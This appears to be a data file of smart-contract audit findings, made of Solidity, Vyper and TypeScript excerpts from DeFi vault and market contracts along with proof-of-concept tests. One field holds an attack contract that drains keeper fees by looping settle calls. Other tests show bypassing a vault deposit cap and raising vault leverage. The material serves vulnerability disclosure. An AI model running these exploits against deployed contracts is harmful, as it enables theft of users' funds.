"```\nfunction emergencyExit(\n    uint256 claimToExit,\n    bytes calldata /* data */\n) external override onlyRole(EMERGENCY_EXIT_ROLE) {\n    StrategyVaultState memory state = VaultStorage.getStrategyVaultState();\n    if (claimToExit == 0) {\n        claimToExit = state.totalPoolClaim;\n    }\n\n    // By setting min amounts to zero, we will accept whatever tokens come from the pool\n    // in a proportional exit. Front running will not have an effect since no trading will\n    // occur during a proportional exit.\n    _unstakeAndExitPool(claimToExit, new uint256[](NUM_TOKENS()), true);\n}\n```\n```\nfunction _unstakeAndExitPool(\n    uint256 poolClaim, uint256[] memory minAmounts, bool isSingleSided\n) internal override returns (uint256[] memory exitBalances) {\n    bool success = AURA_REWARD_POOL.withdrawAndUnwrap(poolClaim, false); // claimRewards = false\n    require(success);\n\n    bytes memory customData;\n    if (isSingleSided) {\n        uint256 primaryIndex = PRIMARY_INDEX();\n        customData = abi.encode(\n            IBalancerVault.ComposableExitKind.EXACT_BPT_IN_FOR_ONE_TOKEN_OUT,\n            poolClaim,\n            primaryIndex < BPT_INDEX? primaryIndex : primaryIndex - 1\n        );\n    }\n```\n```\nfunction _unstakeAndExitPool(\n    uint256 poolClaim, uint256[] memory _minAmounts, bool isSingleSided\n) internal override returns (uint256[] memory exitBalances) {\n    ICurve2TokenPool pool = ICurve2TokenPool(CURVE_POOL);\n    exitBalances = new uint256[](2);\n    if (isSingleSided) {\n        exitBalances[_PRIMARY_INDEX] = pool.remove_liquidity_one_coin(\n            poolClaim, int8(_PRIMARY_INDEX), _minAmounts[_PRIMARY_INDEX]\n        );\n    }\n```"
"```\nfunction _mintVaultShares(uint256 lpTokens) internal returns (uint256 vaultShares) {\n    StrategyVaultState memory state = VaultStorage.getStrategyVaultState();\n    if (state.totalPoolClaim == 0) {\n        vaultShares = (lpTokens * uint256(Constants.INTERNAL_TOKEN_PRECISION)) / POOL_PRECISION();\n    } else {\n        vaultShares = (lpTokens * state.totalVaultSharesGlobal) / state.totalPoolClaim;\n    }\n\n    state.totalPoolClaim += lpTokens;\n    state.totalVaultSharesGlobal += vaultShares.toUint80();\n    state.setStrategyVaultState();\n}\n```\n```\nfunction reinvestReward(\n    SingleSidedRewardTradeParams[] calldata trades,\n    uint256 minPoolClaim\n) external whenNotLocked onlyRole(REWARD_REINVESTMENT_ROLE) returns (\n    address rewardToken,\n    uint256 amountSold,\n    uint256 poolClaimAmount\n) {\n    _checkPriceAndCalculateValue();\n\n    require(trades.length == NUM_TOKENS());\n\n    uint256[] memory amounts;\n    (rewardToken, amountSold, amounts) = _executeRewardTrades(trades);\n\n    poolClaimAmount = _joinPoolAndStake(amounts, minPoolClaim);\n\n    StrategyVaultState memory state = VaultStorage.getStrategyVaultState();\n    state.totalPoolClaim += poolClaimAmount;\n    state.setStrategyVaultState();\n\n    emit RewardReinvested(rewardToken, amountSold, poolClaimAmount);\n}\n```"
"```\nfunction _isInvalidRewardToken(address token) internal override view returns (bool) {\n    return (\n        token == TOKEN_1 ||\n        token == TOKEN_2 ||\n        token == address(CURVE_POOL_TOKEN) ||\n        token == address(CONVEX_REWARD_POOL) ||\n        token == address(CONVEX_BOOSTER) ||\n        token == Deployments.ALT_ETH_ADDRESS\n    );\n}\n```\n```\naddress internal constant ALT_ETH_ADDRESS = \n    0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n```\n```\nfunction _executeTrade(\n    address target,\n    uint256 msgValue,\n    bytes memory params,\n    address spender,\n    Trade memory trade\n) private {\n    uint256 preTradeBalance;\n\n    if (trade.buyToken == address(Deployments.WETH)) {\n        preTradeBalance = address(this).balance;\n    } else if (trade.buyToken == Deployments.ETH_ADDRESS || _needsToUnwrapExcessWETH(trade, spender)) {\n        preTradeBalance = IERC20(address(Deployments.WETH)).balanceOf(address(this));\n    }\n```\n```\nfunction _isInvalidRewardToken(address token) internal override view returns (bool) {\n    return (\n        token == TOKEN_1 ||\n        token == TOKEN_2 ||\n        token == TOKEN_3 ||\n        token == TOKEN_4 ||\n        token == TOKEN_5 ||\n        token == address(AURA_BOOSTER) ||\n        token == address(AURA_REWARD_POOL) ||\n        token == address(Deployments.WETH)\n    );\n}\n```"
"```\nconstructor(\n    NotionalProxy notional_,\n    DeploymentParams memory params\n) SingleSidedLPVaultBase(notional_, params.tradingModule) {\n    CURVE_POOL = params.pool;\n\n    bool isCurveV2 = false;\n    if (Deployments.CHAIN_ID == Constants.CHAIN_ID_MAINNET) {\n        address[10] memory handlers = \n            Deployments.CURVE_META_REGISTRY.get_registry_handlers_from_pool(address(CURVE_POOL));\n\n        require(\n            handlers[0] == Deployments.CURVE_V1_HANDLER ||\n            handlers[0] == Deployments.CURVE_V2_HANDLER\n        );\n        isCurveV2 = (handlers[0] == Deployments.CURVE_V2_HANDLER);\n    }\n    IS_CURVE_V2 = isCurveV2;\n```\n```\nfunction _joinPoolAndStake(\n    // Slightly different method signatures in v1 and v2\n    if (IS_CURVE_V2) {\n        lpTokens = ICurve2TokenPoolV2(CURVE_POOL).add_liquidity{value: msgValue}(\n            amounts, minPoolClaim, 0 < msgValue // use_eth = true if msgValue > 0\n        );\n    } else {\n        lpTokens = ICurve2TokenPoolV1(CURVE_POOL).add_liquidity{value: msgValue}(\n            amounts, minPoolClaim\n        );\n    }\n```\n```\ndef add_liquidity(\n    amounts: uint256[N_COINS],\n    min_mint_amount: uint256,\n    use_eth: bool = False,\n    receiver: address = msg.sender\n) -> uint256:\n    """"""\n    @notice Adds liquidity into the pool.\n    @param amounts Amounts of each coin to add.\n    @param min_mint_amount Minimum amount of LP to mint.\n    @param use_eth True if native token is being added to the pool.\n    @param receiver Address to send the LP tokens to. Default is msg.sender\n    @return uint256 Amount of LP tokens received by the `receiver\n    """"""\n\n    # --------------------- Get prices, balances -----------------------------\n    # -------------------------------------- Update balances and calculate xp.\n    # ---------------- transferFrom token into the pool ----------------------\n\n    for i in range(N_COINS):\n        if amounts[i] > 0:\n            if coins[i] == WETH20:\n                self._transfer_in(\n                    coins[i],\n                    amounts[i],\n                    0,\n                    msg.value,\n                    empty(address),\n                    empty(bytes32),\n                    msg.sender,\n                    empty(address),\n                    use_eth\n                )\n```\n```\ndef _transfer_in(\n    use_eth: bool\n):\n    """"""\n    @params use_eth True if the transfer is ETH, False otherwise.\n    """"""\n\n    if use_eth and _coin == WETH20:\n        assert mvalue == dx  # dev: incorrect eth amount\n    else:\n        if _coin == WETH20:\n            WETH(WETH20).withdraw(dx)  # if WETH was transferred in\n            # previous step and `not use_eth`, withdraw WETH to ETH.\n```"
"```\nif (protected && (\n   !context.closable.isZero() || \n    context.latestPosition.local.maintained(\n        context.latestVersion,\n        context.riskParameter,\n        context.pendingCollateral.sub(collateral)\n    ) || \n    collateral.lt(Fixed6Lib.from(-1, _liquidationFee(context, newOrder)))\n)) {\n    revert MarketInvalidProtectionError();\n}\n\nif (\n   !(context.currentPosition.local.magnitude().isZero() && context.latestPosition.local.magnitude().isZero()) && \n   !(newOrder.isEmpty() && collateral.gte(Fixed6Lib.ZERO)) && \n    (context.currentTimestamp - context.latestVersion.timestamp >= context.riskParameter.staleAfter) \n) {\n    revert MarketStalePriceError();\n}\n\nif (context.marketParameter.closed && newOrder.increasesPosition()) {\n    revert MarketClosedError();\n}\n\nif (context.currentPosition.global.maker.gt(context.riskParameter.makerLimit)) {\n    revert MarketMakerOverLimitError();\n}\n\nif (!newOrder.singleSided(context.currentPosition.local) ||!newOrder.singleSided(context.latestPosition.local)) {\n    revert MarketNotSingleSidedError();\n}\n\nif (protected) {\n    return; // The following invariants do not apply to protected position updates (liquidations)\n}\n```\n```\nit('liquidate with huge open position', async () => {\n  const positionMaker = parse6decimal('20.000');\n  const positionLong = parse6decimal('10.000');\n  const collateral = parse6decimal('1000');\n  const collateral2 = parse6decimal('350');\n  const maxPosition = parse6decimal('4611686018427'); // 2^62-1\n\n  const oracleVersion = {\n    price: parse6decimal('100'),\n    timestamp: TIMESTAMP,\n    valid: true,\n  };\n  oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion);\n  oracle.status.returns([oracleVersion, TIMESTAMP + 100]);\n  oracle.request.returns();\n\n  // maker\n  dsu.transferFrom.whenCalledWith(userB.address, market.address, collateral.mul(1e12)).returns(true);\n  await market.connect(userB).update(userB.address, positionMaker, 0, 0, collateral, false);\n\n  // user opens long=10\n  dsu.transferFrom.whenCalledWith(user.address, market.address, collateral2.mul(1e12)).returns(true);\n  await market.connect(user).update(user.address, 0, positionLong, 0, collateral2, false);\n\n  const oracleVersion2 = {\n    price: parse6decimal('100'),\n    timestamp: TIMESTAMP + 100,\n    valid: true,\n  };\n  oracle.at.whenCalledWith(oracleVersion2.timestamp).returns(oracleVersion2);\n  oracle.status.returns([oracleVersion2, TIMESTAMP + 200]);\n  oracle.request.returns();\n\n  // price moves against user, so he's at the edge of liquidation and tries to close\n  // position: latest=10, pending [t=200] = 0 (closable = 0)\n  await market.connect(user).update(user.address, 0, 0, 0, 0, false);\n\n  const oracleVersion3 = {\n    price: parse6decimal('92'),\n    timestamp: TIMESTAMP + 190,\n    valid: true,\n  };\n  oracle.at.whenCalledWith(oracleVersion3.timestamp).returns(oracleVersion3);\n  oracle.status.returns([oracleVersion3, TIMESTAMP + 300]);\n  oracle.request.returns();\n\n  var loc = await market.locals(user.address);\n  var posLatest = await market.positions(user.address);\n  var posCurrent = await market.pendingPositions(user.address, loc.currentId);\n  console.log(""Before liquidation"
"```\nUFixed6 collateral = marketContext.currentPosition.maker\n   .sub(marketContext.currentPosition.net()\n       .min(marketContext.currentPosition.maker))  # available maker\n   .min(marketContext.closable.mul(StrategyLib.LEVERAGE_BUFFER))\n   .muldiv(marketContext.latestPrice.abs(), registration.leverage)\n   .muldiv(totalWeight, registration.weight)\n```\n```\n_locals.marketCollateral = strategy.marketContexts[marketId].margin\n   .add(collateral.sub(_locals.totalMargin).muldiv(registrations[marketId].weight, _locals.totalWeight))\n```\n```\nit('increase vault leverage', async () => {\n  console.log(""start"");\n\n  async function setOracle(latestTime: BigNumber, currentTime: BigNumber) {\n    await setOracleEth(latestTime, currentTime);\n    await setOracleBtc(latestTime, currentTime);\n  }\n\n  async function setOracleEth(latestTime: BigNumber, currentTime: BigNumber) {\n    const [_, currentPrice] = await oracle.latest();\n    const newVersion = {\n      timestamp: latestTime,\n      price: currentPrice,\n      valid: true,\n    };\n    oracle.status.returns([newVersion, currentTime]);\n    oracle.request.whenCalledWith(user.address).returns();\n    oracle.latest.returns(newVersion);\n    oracle.current.returns(currentTime);\n    oracle.at.whenCalledWith(newVersion.timestamp).returns(newVersion);\n  }\n\n  async function setOracleBtc(latestTime: BigNumber, currentTime: BigNumber) {\n    const [_, currentPrice] = await btcOracle.latest();\n    const newVersion = {\n      timestamp: latestTime,\n      price: currentPrice,\n      valid: true,\n    };\n    btcOracle.status.returns([newVersion, currentTime]);\n    btcOracle.request.whenCalledWith(user.address).returns();\n    btcOracle.latest.returns(newVersion);\n    btcOracle.current.returns(currentTime);\n    btcOracle.at.whenCalledWith(newVersion.timestamp).returns(newVersion);\n  }\n\n  async function logLeverage() {\n    // vault collateral\n    var vaultCollateralEth = (await market.locals(vault.address)).collateral;\n    var vaultCollateralBtc = (await btcMarket.locals(vault.address)).collateral;\n    var vaultCollateral = vaultCollateralEth.add(vaultCollateralBtc);\n\n    // vault position\n    var vaultPosEth = (await market.positions(vault.address)).maker;\n    var ethPrice = (await oracle.latest()).price;\n    var vaultPosEthUsd = vaultPosEth.mul(ethPrice);\n    var vaultPosBtc = (await btcMarket.positions(vault.address)).maker;\n    var btcPrice = (await btcOracle.latest()).price;\n    var vaultPosBtcUsd = vaultPosBtc.mul(btcPrice);\n    var vaultPos = vaultPosEthUsd.add(vaultPosBtcUsd);\n    var leverage = vaultPos.div(vaultCollateral);\n    console.log(""Vault collateral = "" + vaultCollateral.div(1e6) + "" pos = "" + vaultPos.div(1e12) +\n```\nstart\nETH Limit = 1000000000\nCurrentGlobal = 200000000\nCurrentUser = 200000000\nprice = 2620237388\navailToken = 12212633\nmaker = 987787367\n\nBTC Limit = 100000000\nCurrentGlobal = 20000000\nCurrentUser = 20000000\nprice = 38838362695\navailToken = 205981\nmaker = 99794019\n\nmarket updated\n\nVault collateral = 12000\npos = 39999\nleverage = 3333330\n\nreduce maker blocking position to allow vault maker increase\nDeposit small amount to increase position\nRedeeming 11500\nVault collateral = 12010\npos = 8040\nleverage = 669444\n\nClaiming 11100\nVault collateral = 910\npos = 8040\nleverage = 8835153\n```"
"```\nUFixed6 collateral = marketContext.currentPosition.maker\n   .sub(marketContext.currentPosition.net()\n       .min(marketContext.currentPosition.maker))  # available maker\n   .min(marketContext.closable.mul(StrategyLib.LEVERAGE_BUFFER))  # available closable\n   .muldiv(marketContext.latestPrice.abs(), registration.leverage)  # available collateral\n   .muldiv(totalWeight, registration.weight)  # collateral in market\n\nredemptionAssets = redemptionAssets.min(collateral)\n```"
"```\nfunction settle(\n    bytes32[] memory ids,\n    IMarket[] memory markets,\n    uint256[] memory versions,\n    uint256[] memory maxCounts\n) external {\n    if (\n        ids.length!= markets.length ||\n        ids.length!= versions.length ||\n        ids.length!= maxCounts.length ||\n        // Prevent calldata stuffing\n        abi.encodeCall(KeeperFactory.settle, (ids, markets, versions, maxCounts)).length!= msg.data.length\n    ) {\n        revert KeeperFactoryInvalidSettleError();\n    }\n\n    for (uint256 i = 0; i < ids.length; i++) {\n        IKeeperOracle(address(oracles[ids[i]])).settle(markets[i], versions[i], maxCounts[i]);\n    }\n}\n```\n```\ninterface IKeeperFactory {\n    function settle(bytes32[] memory ids, IMarket[] memory markets, uint256[] memory versions, uint256[] memory maxCounts) external;\n}\n\ninterface IMarket {\n    function update() external;\n}\n\ncontract AttackContract {\n    address public attacker;\n    address public keeperFactory;\n    IERC20 public keeperToken;\n\n    constructor(address perennialDeployedKeeperFactory, IERC20 _keeperToken) {\n        attacker = msg.sender;\n        keeperFactory = perennialDeployedKeeperFactory;\n        keeperToken = _keeperToken;\n    }\n\n    function attack() external {\n        require(msg.sender == attacker, ""not allowed"");\n\n        bool canSteal = true;\n\n        // empty arrays as parameters\n        bytes32[] memory ids = [];\n        IMarket[] memory markets = [];\n        uint256[] memory versions = [];\n        uint256[] memory maxCounts = [];\n\n        // perform attack in a loop till all funds are drained or call reverts\n        while (canSteal) {\n            try IKeeperFactory(keeperFactory).settle(ids, markets, versions, maxCounts) {\n                // empty block\n            } catch {\n                canSteal = false;\n            }\n        }\n        keeperToken.transfer(msg.sender, keeperToken.balanceOf(address(this)));\n    }\n}\n```"
"```\nmodifier keep(\n    KeepConfig memory config,\n    bytes calldata applicableCalldata,\n    uint256 applicableValue,\n    bytes memory data\n) {\n    uint256 startGas = gasleft();\n\n    uint256 applicableGas = startGas - gasleft();\n    (UFixed18 baseFee, UFixed18 calldataFee) = (\n        _baseFee(applicableGas, config.multiplierBase, config.bufferBase),\n        _calldataFee(applicableCalldata, config.multiplierCalldata, config.bufferCalldata)\n    );\n\n    UFixed18 keeperFee = UFixed18.wrap(applicableValue).add(baseFee).add(calldataFee).mul(_etherPrice());\n    _raiseKeeperFee(keeperFee, data);\n    keeperToken().push(msg.sender, keeperFee);\n\n    emit KeeperCall(msg.sender, applicableGas, applicableValue, baseFee, calldataFee, keeperFee);\n}\n```"
"```\nif (\n   !context.currentPosition.local.margined(\n        context.latestVersion,\n        context.riskParameter,\n        context.pendingCollateral\n    )\n) {\n    revert MarketInsufficientMarginError();\n}\n```\n```\nif (\n   !PositionLib.maintained(\n        context.maxPendingMagnitude,\n        context.latestVersion,\n        context.riskParameter,\n        context.pendingCollateral\n    )\n) {\n    revert MarketInsufficientMaintenanceError();\n}\n```"
```\nif (context.currentPosition.global.maker.gt(context.riskParameter.makerLimit)):\n    revert MarketMakerOverLimitError()\n```
"```\nmapping(uint256 => EnumerableSet.AddressSet) private _globalCallbacks;\n\nmapping(uint256 => mapping(IMarket => EnumerableSet.AddressSet)) private _localCallbacks;\n```\n```\nfunction request(IMarket market, address account) external onlyAuthorized {\n    uint256 currentTimestamp = current();\n    if (versions[_global.currentIndex] == currentTimestamp) {\n        return;\n    }\n\n    versions[++_global.currentIndex] = currentTimestamp;\n    emit OracleProviderVersionRequested(currentTimestamp);\n\n    // only the first request per version reaches these lines to add market+account to callback list\n    _globalCallbacks[currentTimestamp].add(address(market));\n    _localCallbacks[currentTimestamp][market].add(account);\n    emit CallbackRequested(SettlementCallback(market, account, currentTimestamp));\n}\n```"
"```\n/// @dev One instance per price feed should be deployed. Multiple products may use the same\n///      KeeperOracle instance if their payoff functions are based on the same underlying oracle.\n///      This implementation only supports non-negative prices.\n```\n```\nfor (uint256 i; i < _globalCallbacks[version.timestamp].length(); i++) {\n    _settle(IMarket(_globalCallbacks[version.timestamp].at(i)), address(0));\n}\n\nfunction _settle(IMarket market, address account) private {\n    market.update(account, UFixed6Lib.MAX, UFixed6Lib.MAX, UFixed6Lib.MAX, Fixed6Lib.ZERO, false);\n}\n```\n```\nfunction update(\n    address account,\n    UFixed6 newMaker,\n    UFixed6 newLong,\n    UFixed6 newShort,\n    Fixed6 collateral,\n    bool protect\n) external nonReentrant whenNotPaused {\n```\n```\nfunction _latestStale(OracleVersion memory currentOracleLatestVersion) private view returns (bool) {\n    if (global.current == global.latest) {\n        return false;\n    }\n    if (global.latest == 0) {\n        return true;\n    }\n\n    if (uint256(oracles[global.latest].timestamp) > oracles[global.latest].provider.latest().timestamp) {\n        return false;\n    }\n    if (uint256(oracles[global.latest].timestamp) >= currentOracleLatestVersion.timestamp) {\n        return false;\n    }\n\n    return true;\n}\n```"
"```\nfunction _maxDeposit(Context memory context) private view returns (UFixed6) {\n    if (context.latestCheckpoint.unhealthy()) {\n        return UFixed6Lib.ZERO;\n    }\n    UFixed6 collateral = UFixed6Lib.from(totalAssets().max(Fixed6Lib.ZERO)).add(context.global.deposit);\n    return context.global.assets.add(context.parameter.cap.sub(collateral.min(context.parameter.cap)));\n}\n\nif (depositAssets.gt(_maxDeposit(context))) {\n    revert VaultDepositLimitExceededError();\n}\n```\n```\nit('bypass vault deposit cap', async () => {\n  console.log(""start"");\n\n  await vault.connect(owner).updateParameter({\n    cap: parse6decimal('100'),\n  });\n\n  await updateOracle();\n\n  var deposit = parse6decimal('100');\n  console.log(""Deposit 100"");\n  await vault.connect(user).update(user.address, deposit, 0, 0);\n\n  await updateOracle();\n  await vault.settle(user.address);\n\n  var assets = await vault.totalAssets();\n  console.log(""Vault assets: "" + assets);\n\n  // additional deposit reverts due to cap\n  var deposit = parse6decimal('10');\n  console.log(""Deposit 10 revert"");\n  await expect(vault.connect(user).update(user.address, deposit, 0, 0)).to.be.reverted;\n\n  // now redeem 50\n  var redeem = parse6decimal('50');\n  console.log(""Redeem 50"");\n  await vault.connect(user).update(user.address, 0, redeem, 0);\n\n  await updateOracle();\n  await vault.settle(user.address);\n\n  var assets = await vault.totalAssets();\n  console.log(""Vault assets: "" + assets);\n\n  // deposit 100 (50+100=150) doesn't revert, because assets = 50\n  var deposit = parse6decimal('100');\n  console.log(""Deposit 100"");\n  await vault.connect(user).update(user.address, deposit, 0, 0);\n\n  await updateOracle();\n  await vault.settle(user.address);\n\n  var assets = await vault.totalAssets();\n  console.log(""Vault assets: "" + assets);\n\n  var deposit = parse6decimal('50');\n  console.log(""Deposit 50"");\n  await vault.connect(user).update(user.address, deposit, 0, 0);\n\n  await updateOracle();\n  await vault.settle(user.address);\n\n  var assets = await vault.totalAssets();\n  console.log(""Vault assets: "" + assets);\n})\n```\nstart\nDeposit 100\nVault assets: 100000000\nDeposit 10\nrevert\nVault assets: 50000000\nRedeem 50\nVault assets: 50000000\nDeposit 100\nVault assets: 150000000\nDeposit 50\nVault assets: 200000000\n```"
"```\nlocal memory local = registration.market.locals(address(this))\ncontext.latestIds.update(marketId, local.latestId)\ncontext.currentIds.update(marketId, local.currentId)\ncontext.collaterals[marketId] = local.collateral\n```\ncontext.pendingCollateral = context.pendingCollateral\n   .sub(newPendingPosition.fee)\n   .sub(Fixed6Lib.from(newPendingPosition.keeper));\n\nif (protected && (\n   !context.closable.isZero() || \n    // @audit-issue even if closable is 0, position can still increase\n    context.latestPosition.local.maintained(\n        context.latestVersion,\n        context.riskParameter,\n        context.pendingCollateral.sub(collateral)\n    ) ||\n    collateral.lt(Fixed6Lib.from(-1, _liquidationFee(context, newOrder)))\n)) {\n    revert MarketInvalidProtectionError();\n}\n\nif (\n   !context.currentPosition.local.margined(\n        context.latestVersion,\n        context.riskParameter,\n        context.pendingCollateral\n    )\n) {\n    revert MarketInsufficientMarginError();\n}\n\nif (\n   !PositionLib.maintained(\n        context.maxPendingMagnitude,\n        context.latestVersion,\n        context.riskParameter,\n        context.pendingCollateral\n    )\n) {\n    revert MarketInsufficientMaintenanceError();\n}\n```"
"```\nOracleVersion memory latestOracleVersion = market.oracle().latest();\nlatestPrice = latestOracleVersion.price;\nIPayoffProvider payoff = market.payoff();\nif (address(payoff)!= address(0)) {\n    latestPrice = payoff.payoff(latestPrice);\n}\n```\n```\nfunction _commitRequested(OracleVersion memory version) private returns (bool) {\n    if (block.timestamp <= (next() + timeout)) {\n        if (!version.valid) {\n            revert KeeperOracleInvalidPriceError();\n        }\n        _prices[version.timestamp] = version.price;\n    }\n    _global.latestIndex++;\n    return true;\n}\n```\n```\nfunction _liquidationFee(\n    IMarket market,\n    address account\n) internal view returns (Position memory, UFixed6, UFixed6) {\n    RiskParameter memory riskParameter = market.riskParameter();\n\n    (Position memory latestPosition, Fixed6 latestPrice, UFixed6 closableAmount) = _latest(market, account);\n\n    Order memory placeholderOrder;\n    placeholderOrder.maker = Fixed6Lib.from(closableAmount);\n\n    return (\n        latestPosition,\n        placeholderOrder\n           .liquidationFee(\n                OracleVersion(latestPosition.timestamp, latestPrice, true),\n                riskParameter\n            )\n           .min(UFixed6Lib.from(market.token().balanceOf(address(market)))),\n        closableAmount\n    );\n}\n```\n```\nfunction _liquidate(\n    IMarket market,\n    address account,\n    bool revertOnFailure\n) internal isMarketInstance(market) {\n    (\n        Position memory latestPosition,\n        UFixed6 liquidationFee,\n        UFixed6 closable\n    ) = _liquidationFee(market, account);\n\n    Position memory currentPosition = market.pendingPositions(account, market.locals(account).currentId);\n    currentPosition.adjust(latestPosition);\n\n    try market.update(\n        account,\n        currentPosition.maker.isZero()? UFixed6Lib.ZERO : currentPosition.maker.sub(closable),\n        currentPosition.long.isZero()? UFixed6Lib.ZERO : currentPosition.long.sub(closable),\n        currentPosition.short.isZero()? UFixed6Lib.ZERO : currentPosition.short.sub(closable),\n        Fixed6Lib.from(-1, liquidationFee),\n        true\n    );\n}\n```\nfunction _executeOrder(address account, IMarket market, uint256 nonce) internal {\n    if (!canExecuteOrder(account, market, nonce)) {\n        revert MultiInvokerCantExecuteError();\n    }\n}\n\nfunction canExecuteOrder(address account, IMarket market, uint256 nonce) public view returns (bool) {\n    TriggerOrder memory order = orders(account, market, nonce);\n    if (order.fee.isZero()) {\n        return false;\n    }\n    (, Fixed6 latestPrice, ) = _latest(market, account);\n    return order.fillable(latestPrice);\n}\n```"
"```\nfor (uint256 id = context.local.latestId + 1; id < context.local.currentId; id++) {\n    _processPendingPosition(context, _loadPendingPositionLocal(context, account, id));\n}\n```\n```\nfunction _update(\n    context,\n    account) {\n    _loadUpdateContext(context, account);\n    context.currentPosition.local.update(collateral);\n    _processPendingPosition(context, context.currentPosition.local);\n    _invariant(context, account, newOrder, collateral, protected);\n}\n```\n```\nfor (uint256 id = local.latestId + 1; id <= local.currentId; id++) {\n    Position memory pendingPosition = market.pendingPositions(account, id);\n    pendingPosition.adjust(latestPosition);\n\n    if (pendingPosition.timestamp <= latestTimestamp) {\n        if (!market.oracle().at(pendingPosition.timestamp).valid) {\n            latestPosition.invalidate(pendingPosition);\n        }\n        latestPosition.update(pendingPosition);\n\n        previousMagnitude = latestPosition.magnitude();\n        closableAmount = previousMagnitude;\n    } else {\n        closableAmount = closableAmount.sub(previousMagnitude.sub(pendingPosition.magnitude().min(previousMagnitude)));\n        previousMagnitude = latestPosition.magnitude();\n    }\n}\n```\nfor (uint256 id = marketContext.local.latestId + 1; id <= marketContext.local.currentId; id++) {\n    previousClosable = _loadPosition(\n        marketContext,\n        marketContext.currentAccountPosition = registration.market.pendingPositions(address(this), id),\n        previousClosable\n    );\n}\n```"
"```\nfunction _processPendingPosition(Context memory context, Position memory newPendingPosition) private {\n    context.pendingCollateral = context.pendingCollateral\n       .sub(newPendingPosition.fee)\n       .sub(Fixed6Lib.from(newPendingPosition.keeper));\n\n    context.closable = context.closable\n       .sub(context.previousPendingMagnitude\n           .sub(newPendingPosition.magnitude().min(context.previousPendingMagnitude)));\n\n    context.previousPendingMagnitude = newPendingPosition.magnitude();\n\n    if (context.previousPendingMagnitude.gt(context.maxPendingMagnitude)) {\n        context.maxPendingMagnitude = newPendingPosition.magnitude();\n    }\n}\n```\n```\nfunction _latest(\n    IMarket market,\n    address account\n) internal view returns (Position memory latestPosition, Fixed6 latestPrice, UFixed6 closableAmount) {\n    OracleVersion memory latestOracleVersion = market.oracle().latest();\n    latestPrice = latestOracleVersion.price;\n    IPayoffProvider payoff = market.payoff();\n    if (address(payoff)!= address(0)) {\n        latestPrice = payoff.payoff(latestPrice);\n    }\n\n    uint256 latestTimestamp = latestOracleVersion.timestamp;\n    latestPosition = market.positions(account);\n    closableAmount = latestPosition.magnitude();\n    UFixed6 previousMagnitude = closableAmount;\n\n    Local memory local = market.locals(account);\n    for (uint256 id = local.latestId + 1; id <= local.currentId; id++) {\n        Position memory pendingPosition = market.pendingPositions(account, id);\n        pendingPosition.adjust(latestPosition);\n\n        if (pendingPosition.timestamp <= latestTimestamp) {\n            if (!market.oracle().at(pendingPosition.timestamp).valid) {\n                latestPosition.invalidate(pendingPosition);\n            }\n            latestPosition.update(pendingPosition);\n\n            previousMagnitude = latestPosition.magnitude();\n            closableAmount = previousMagnitude;\n        } else {\n            closableAmount = closableAmount.sub(previousMagnitude.sub(pendingPosition.magnitude().min(previousMagnitude)));\n            previousMagnitude = latestPosition.magnitude();\n        }\n    }\n}"
"```\nstruct StoredTriggerOrder {\n    uint8 side;                // 0 = maker, 1 = long, 2 = short, 3 = collateral\n    int8 comparison;           // -2 = lt, -1 = lte, 0 = eq, 1 = gte, 2 = gt\n    uint64 fee;                // <= 18.44tb\n    int64 price;               // <= 9.22t\n    int64 delta;               // <= 9.22t\n    uint48 interfaceFeeAmount; // <= 281m\n\n    address interfaceFeeReceiver;\n    bool interfaceFeeUnwrap;\n    bytes11 __unallocated0__;\n}\n\nlibrary TriggerOrderLib {\n    function store(TriggerOrderStorage storage self, TriggerOrder memory newValue) internal {\n        if (newValue.side > uint8.type.max) revert TriggerOrderStorageInvalidError();\n        if (newValue.comparison > int8.type.max) revert TriggerOrderStorageInvalidError();\n        if (newValue.comparison < int8.type.min) revert TriggerOrderStorageInvalidError();\n        if (newValue.fee > UFixed6.wrap(uint64.type.max)) revert TriggerOrderStorageInvalidError();\n        if (newValue.price > Fixed6.wrap(int64.type.max)) revert TriggerOrderStorageInvalidError();\n        if (newValue.price < Fixed6.wrap(int64.type.min)) revert TriggerOrderStorageInvalidError();\n        if (newValue.delta > Fixed6.wrap(int64.type.max)) revert TriggerOrderStorageInvalidError();\n        if (newValue.delta < Fixed6.wrap(int64.type.min)) revert TriggerOrderStorageInvalidError();\n        if (newValue.interfaceFeeAmount > UFixed6.wrap(uint48.type.max)) revert TriggerOrderStorageInvalidError();\n\n        self.value = StoredTriggerOrder(\n            uint8(newValue.side),\n            int8(newValue.comparison),\n            uint64(UFixed6.unwrap(newValue.fee)),\n            int64(Fixed6.unwrap(newValue.price)),\n            int64(Fixed6.unwrap(newValue.delta)),\n            uint40(UFixed6.unwrap(newValue.interfaceFeeAmount)),\n            newValue.interfaceFee.receiver,\n            newValue.interfaceFee.unwrap,\n            bytes11(0)\n        );\n    }\n}"
"```\nfunction claimReward() external onlyOwner {\n    for (uint256 marketId; marketId < totalMarkets; marketId++) {\n        _registrations[marketId].read().market.claimReward();\n        _registrations[marketId].read().market.reward().push(factory().owner());\n    }\n}\n```\n```\ncontract Market is IMarket, Instance, ReentrancyGuard {\n    Token18 public reward;\n\n    function initialize(IMarket.MarketDefinition calldata definition_) external initializer(1) {\n        __Instance__initialize();\n        __ReentrancyGuard__initialize();\n\n        token = definition_.token;\n        oracle = definition_.oracle;\n        payoff = definition_.payoff;\n    }\n\n    library MarketParameterStorageLib {\n        function validate(\n            MarketParameter memory self,\n            ProtocolParameter memory protocolParameter,\n            Token18 reward\n        ) public pure {\n            if (self.settlementFee > protocolParameter.maxFeeAbsolute) {\n                revert MarketParameterStorageInvalidError();\n            }\n\n            if (self.fundingFee.max(self.interestFee).max(self.positionFee) > protocolParameter.maxCut) {\n                revert MarketParameterStorageInvalidError();\n            }\n\n            if (self.oracleFee.add(self.riskFee) > UFixed6Lib.ONE) {\n                revert MarketParameterStorageInvalidError();\n            }\n\n            if (\n                reward.isZero() &&\n                (!self.makerRewardRate.isZero() ||!self.longRewardRate.isZero() ||!self.shortRewardRate.isZero())\n            ) {\n                revert MarketParameterStorageInvalidError();\n            }\n        }\n    }\n}"
